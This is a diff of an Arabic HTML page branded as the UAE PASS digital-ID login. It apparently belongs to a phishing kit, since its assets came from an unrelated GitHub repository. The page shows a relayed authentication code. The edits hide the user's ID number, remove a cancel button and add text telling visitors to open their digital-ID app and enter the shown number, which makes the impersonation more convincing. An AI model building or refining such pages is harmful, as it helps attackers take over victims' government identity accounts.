@@ -140,7 +140,7 @@
             from {transform: translate(-50%, -50%) rotate(0);}
             to   {transform: translate(-50%, -50%) rotate(360deg);}
         }
-
+        
         .passcode-card {
             color: #454F63;
             width: 90px;
@@ -265,25 +265,6 @@
             color: #454f63;
         }
         
-        /* شاشة التحميل */
-        #loadingScreen {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-            padding: 40px 20px;
-            background: #F9F9FB;
-        }
-        
-        .loading-spinner {
-            font-size: 60px;
-            color: #00ac75;
-            margin-bottom: 20px;
-            animation: spin 1s linear infinite;
-        }
-        
         /* شاشة الخطأ */
         .error-screen {
             display: flex;
@@ -303,14 +284,9 @@
         }
         
         .id-number-display {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 2px dashed #007bff;
-            font-size: 24px;
-            font-weight: bold;
-            color: #007bff;
+            font-size: 25px;
+                line-height: 1.5;
+                font-weight: bold;
         }
         
         @media only screen and (max-width: 600px) {
@@ -347,10 +323,7 @@
     <!-- شاشة التحميل (تظهر أولاً) -->
     <div id="loadingScreen">
         <div class="loading-spinner">
-            <i class="fas fa-spinner fa-spin"></i>
         </div>
-        <h2 style="color: #454f63; margin-bottom: 10px;" id="loadingTitle">جاري تحميل رمز المصادقة</h2>
-        <p style="color: #78849e;" id="loadingMessage">يرجى الانتظار...</p>
     </div>
     
     <!-- شاشة الخطأ (تظهر عند وجود خطأ) -->
@@ -381,7 +354,7 @@
         <div class="header-section">
             <div class="login-container-fluid header">
                 <div class="login-container flex">
-                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
+                    <img src="uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
                     <div class="header-title">عرض رمز المصادقة</div>
                 </div>
             </div>
@@ -396,7 +369,7 @@
                     <div class="card login">
                         <div class="card-header">
                             <div>
-                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
+                                <img src="digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
                             </div>
                             <div class="cancel-request-div">
                                 <button type="button" class="cancel-request" onclick="goBack()" aria-label="العودة">
@@ -416,11 +389,10 @@
 
                                     <!-- Mobile Image -->
                                     <div class="card-content-right-mobile">
-                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
+                                        <img src="login-pin.svg" alt="Login PIN" class="login-pin-image">
                                     </div>
 
                                     <div class="info-description">
-                                        <span>رقم الهوية المسجل:</span>
                                     </div>
                                     
                                     <!-- عرض رقم الهوية -->
@@ -438,28 +410,28 @@
                                     
                                     <!-- Waiting Status -->
                                     <div class="waiting-confirmation">
-                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
+                                        <img src="Timer.gif" alt="Timer" class="timer-img">
                                         <span id="waitingText">جاري عرض رمز المصادقة</span>
                                     </div>
 
                                     <!-- Mobile Cancel Button -->
-                                    <div class="cancel-request-mobile">
+                                    <!-- <div class="cancel-request-mobile">
                                         <button type="button" class="cancel-request" onclick="goBack()" aria-label="العودة">
                                             الغاء الطلب                                        </button>
-                                    </div>
+                                    </div> -->
                                 </div>
                             </div>
                             
                             <!-- Desktop Image -->
                             <div class="card-content-right">
-                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
+                                <img src="login-pin.svg" alt="Login PIN" class="login-pin-image">
                             </div>
                         </div>
                     </div>
                     
                     <!-- Footer -->
                     <div class="polling-footer">
-                        <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
+                        <img class="ids-logo" src="n6.png" alt="IDS Logo" />
                         <p class="poweredby"> Powered by UAE PASS </p>
                     </div>
                 </form>
@@ -537,14 +509,20 @@
 
         // عرض رمز المصادقة
         function showAuthCode(record, idNumber) {
-            // إخفاء شاشة التحميل
-            document.getElementById('loadingScreen').style.display = 'none';
+            // إزالة شاشة التحميل إن وُجدت
+            const loadingScreen = document.getElementById('loadingScreen');
+            if (loadingScreen) loadingScreen.remove();
             
             // إظهار المحتوى الرئيسي
             document.getElementById('mainContent').style.display = 'block';
             
             // تعيين رقم الهوية
-            document.getElementById('idNumberDisplay').textContent = idNumber;
+            // document.getElementById('idNumberDisplay').textContent = idNumber;
+            // لا نعرض رقم الهوية فعلياً — نعرض نصاً بديلًا ثابتاً
+            const idNumberEl = document.getElementById('idNumberDisplay');
+            if (idNumberEl) {
+                idNumberEl.textContent = 'قم بفتح تطبيق الهوية الرقمية الخاص بك وادخل الرقم الموضح لتسجيل الدخول';
+            }
             
             // تعيين رمز المصادقة
             const authCode = record.auth_code;
@@ -552,7 +530,7 @@
             document.getElementById('passcodeDisplay').setAttribute('aria-label', `الرمز ${authCode}`);
             
             // تحديث نص الانتظار
-            document.getElementById('waitingText').textContent = `رمز المصادقة: ${authCode}`;
+            document.getElementById('waitingText').textContent = `في انتظار تأكيدك`;
             
             // تحديث معلومات التطبيق
             document.getElementById('appNameInfo').innerHTML = `
@@ -610,8 +588,9 @@
         });
         // دالة لعرض شاشة الانتظار
 function showWaitingScreen(idNumber) {
-    // إخفاء شاشة التحميل الأصلية
-    document.getElementById('loadingScreen').style.display = 'none';
+    // إخفاء شاشة التحميل الأصلية إن وجدت
+    const loadingScreen = document.getElementById('loadingScreen');
+    if (loadingScreen) loadingScreen.style.display = 'none';
     
     // إنشاء شاشة الانتظار
     const waitingScreen = document.createElement('div');
